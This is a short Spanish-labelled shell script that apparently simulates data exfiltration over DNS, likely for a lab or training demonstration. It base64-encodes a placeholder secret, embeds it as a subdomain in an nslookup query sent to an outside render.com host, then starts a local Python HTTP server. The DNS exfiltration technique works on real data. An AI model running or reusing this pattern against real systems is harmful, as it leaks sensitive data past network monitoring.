#!/bin/sh

DATOS_SENSIBLES="clave_secreta_banco_2026"
DATOS_CODIFICADOS=$(echo -n "$DATOS_SENSIBLES" | base64 | tr -d '=')
HOST="${TARGET_HOST:-servidor-web-dmz-asaumeth.onrender.com}"

echo "=== SIMULACIÓN: EXFILTRACIÓN DE DATOS VÍA CONSULTAS DNS ==="
echo "Dato original: $DATOS_SENSIBLES"
echo "Dato codificado: $DATOS_CODIFICADOS"
echo "Enviando consulta DNS con el payload incrustado hacia $HOST..."

nslookup "${DATOS_CODIFICADOS}.${HOST}"

echo "=== CONSULTA DNS ENVIADA CON ÉXITO ==="

python3 -m http.server 8080
